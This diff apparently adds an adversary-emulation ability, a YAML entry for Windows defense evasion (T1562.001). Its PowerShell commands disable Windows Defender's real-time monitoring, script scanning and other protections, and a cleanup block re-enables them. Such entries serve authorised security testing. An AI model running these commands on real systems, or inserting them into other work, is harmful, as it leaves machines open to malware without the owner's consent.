@@ -1,0 +1,25 @@
+---
+
+- id: b007f6e8-4a87-4440-8888-29ceab047d9b
+  name: Disable Windows Defender All
+  description: Disable Windows Defender All
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.001
+    name: "Impair Defenses: Disable or Modify Tools"
+  privilege: Elevated
+  platforms:
+    windows:
+      psh:
+        command: |
+          Set-MpPreference -DisableIntrusionPreventionSystem $true;
+          Set-MpPreference -DisableIOAVProtection $true;
+          Set-MpPreference -DisableRealtimeMonitoring $true;
+          Set-MpPreference -DisableScriptScanning $true;
+          Set-MpPreference -EnableControlledFolderAccess Disabled;
+        cleanup: |
+          Set-MpPreference -DisableIntrusionPreventionSystem $false;
+          Set-MpPreference -DisableIOAVProtection $false;
+          Set-MpPreference -DisableRealtimeMonitoring $false;
+          Set-MpPreference -DisableScriptScanning $false;
+          Set-MpPreference -EnableControlledFolderAccess Enabled;
